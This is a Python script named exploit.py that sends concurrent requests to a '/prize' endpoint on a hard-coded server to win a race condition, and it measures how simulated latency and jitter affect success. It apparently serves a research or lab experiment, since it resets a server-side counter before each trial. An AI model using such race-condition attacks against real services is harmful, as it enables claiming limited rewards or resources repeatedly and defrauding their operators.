"""
exploit.py
----------------
by Mike Liao

Exploits a vulnerable web server by sending concurrent requests.
"""

import http.client
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# Import scipy.stats if available, which is used only for simulating
# network latency with a specified distribution
try:
    from scipy.stats import expon, norm, bernoulli
except ImportError:
    pass

from arg_parser import parse_args, LatencyType

SERVER_IP = "122.116.40.9"
SERVER_PORT = 25632
CONCURRENT_REQUESTS = 2
LEGIT_NUM_REQUESTS = 1
FIXED_LATENCY = 100 / 1000 # 100 ms
global log_file

class RequestLatency:
    def __init__(self, start_time):
        self.start_time = start_time
    
    def end(self, end_time):
        self.end_time = end_time

    def latency(self):
        return self.end_time - self.start_time

def compute_jitter(latency_map):
    jitter_ls = []
    temp_latency_ls = []
    for i, item in latency_map.items():
        temp_latency_ls.append((item.start_time, item.end_time, item.latency()))
        rq_request_latency_msg = f"Request {i + 1} start time: {datetime.fromtimestamp(item.start_time)}, "\
            f"end time: {datetime.fromtimestamp(item.end_time)}, latency: {item.latency() * 1e3:.4f} ms"
        print(rq_request_latency_msg)

    temp_latency_ls.sort(key=lambda x: x[1])
    for i in range(len(temp_latency_ls)):
        if i == 0:
            continue
        # Difference of the latency between sequential requests
        jitter = abs(temp_latency_ls[i][2] - temp_latency_ls[i - 1][2]) * 1e3
        # Account for the difference in start time (due to delay in sending the request)
        jitter += (temp_latency_ls[i][0] - temp_latency_ls[0][0]) * 1e3
        print(f"Jitter between request {i} and {i+1}: {jitter:.4f} ms")
        jitter_ls.append(jitter)
    return jitter_ls

def compute_jitter_stats(jitter_ls):
    msg = ""
    if jitter_ls:
        average_jitter = sum(jitter_ls) / len(jitter_ls)
        msg += f"\nNetwork Jitter Estimate:\nAverage Jitter: {average_jitter:.4f} ms\n"
        
        # Manually calculate the standard deviation for jitter
        variance = sum([(x - average_jitter) ** 2 for x in jitter_ls]) / len(jitter_ls)
        std_deviation = variance ** 0.5
        msg += f"Jitter Standard Deviation: {std_deviation:.4f} ms"
    else:
        msg = "Not enough data to calculate jitter."
    return msg, average_jitter, std_deviation

"""
Simulate network latency given the latency_type and 
latency_params, the degree of latency.
"""
def simulate_network_latency(latency_type: LatencyType, *latency_params):
    # No network latency
    if latency_type == LatencyType.NONE:
        time.sleep(FIXED_LATENCY)
    # Simulate consistent network latency with a given delay in ms.
    elif latency_type == LatencyType.CONSISTENT:
        time.sleep(latency_params[0])
    # Simulate network jitter with a distribution.
    elif latency_type == LatencyType.JITTER:
        time.sleep(latency_params[1])
    elif latency_type == LatencyType.JITTER_NORMAL:
        time.sleep(latency_params[2])

def simulate_network_jitter(latency_type: LatencyType, *latency_params):
    # No network latency
    if latency_type == LatencyType.NONE:
        return 0
    # Simulate consistent network latency with a given delay in ms.
    elif latency_type == LatencyType.CONSISTENT:
        return 0
    # Simulate network jitter with a distribution.
    elif latency_type == LatencyType.JITTER:
        dist = expon(scale=latency_params[0])
        sample = dist.rvs()
        if bernoulli.rvs(0.5) == 1:
            sample = -sample
        return sample
    elif latency_type == LatencyType.JITTER_NORMAL:
        dist = norm(loc=latency_params[0], scale=latency_params[1])
        sample = dist.rvs()
        return sample
    
    print("Invalid latency type")
    return 0

"""
Run the exploit code with a given latency configuration.
"""
def launch_attack(trial_index, log_file, verbose, latency_type: LatencyType, *latency_params):
    num_200 = 0
    num_400 = 0
    latency_map = {}

    # Mutex for each network request thread to report the response status
    lock = threading.Lock()

    # Helper function to track the response status
    def track_response(idx, response):
        nonlocal num_200, num_400, latency_map
        
        end_time = float(response.getheader('end-time'))
        with lock:
            latency_map[idx].end(end_time)

        if response.status == 200:
            with lock:
                num_200 += 1
        elif response.status == 400:
            with lock:
                num_400 += 1

    # Helper function to send a network request, with the
    # given latency simulation configurations
    def send_request(idx, verbose, latency_type: LatencyType, *latency_params):
        conn = http.client.HTTPConnection(SERVER_IP, SERVER_PORT)
        simulate_network_latency(latency_type, *latency_params)
        nonlocal latency_map
        start_time = time.time()
        latency_map.update({idx: RequestLatency(start_time)})
        headers = {'id': str(idx)}
        conn.request("GET", "/prize", headers=headers)
        response = conn.getresponse()
        track_response(idx, response)
        conn.close()

    # previous_latency = FIXED_LATENCY
    with ThreadPoolExecutor(max_workers=CONCURRENT_REQUESTS) as executor:
        futures = []
        for i in range(CONCURRENT_REQUESTS):
            if i == 0:
                jitter = 0
            else:
                jitter = simulate_network_jitter(latency_type, *latency_params)
            # previous_latency += jitter
            applied_latency = FIXED_LATENCY + jitter
            copy_params = list(latency_params)
            copy_params = copy_params[:2]
            copy_params.append(applied_latency)
            future = executor.submit(send_request, i, verbose, latency_type, *latency_params)
            futures.append(future)

    for future in futures:
        future.result()

    if verbose:
        if num_200 > 1:
            print("Successful")
        else:
            print("Failed")
    
    jitter_ls = compute_jitter(latency_map)

    if log_file:
        log_message = f"Trial {trial_index}: Number of 200 responses: {num_200}, Number of 400 responses: {num_400}\n"
        log_file.write(log_message)  # Write to the file instead of printing
    
    return num_200, num_400, jitter_ls

"""
Reset the counter in the server. Run before each exploitation trial.
"""
def reset_counter(idx):
    conn = http.client.HTTPConnection(SERVER_IP, SERVER_PORT)
    headers = {'secret-key': 'anything', "experiment-id": str(idx)}
    conn.request("GET", "/reset", "", headers)
    _ = conn.getresponse()
    conn.close()

if __name__ == "__main__":
    latency_type, latency_params, _, verbose, num_concurrent_requests, server_ip = parse_args()
    if server_ip:
        SERVER_IP = server_ip
        print("Connecting to server at", SERVER_IP)

    CONCURRENT_REQUESTS = num_concurrent_requests
    reset_counter(0)

    # Run the exploit code with the specified latency configuration
    num_200, num_400, jitter_ls = launch_attack(0, None, verbose, latency_type, *latency_params)
    
    summary = f"\nExperiment Parameters:\n" \
        f"Number of requests per iteration: {CONCURRENT_REQUESTS}\n" \
        f"{latency_type}\n" \
        f"Latency parameters: {latency_params}\n"

    summary += f"Number of 200 responses: {num_200}, Number of 400 responses: {num_400}\n"\
        f"Successful exploit: {CONCURRENT_REQUESTS - LEGIT_NUM_REQUESTS - num_400 > 0}\n"
    
    print("\nlen: ", len(jitter_ls), "jitter: ", jitter_ls)
    msg, average_jitter, std_deviation = compute_jitter_stats(jitter_ls)
    summary += msg

    print(summary)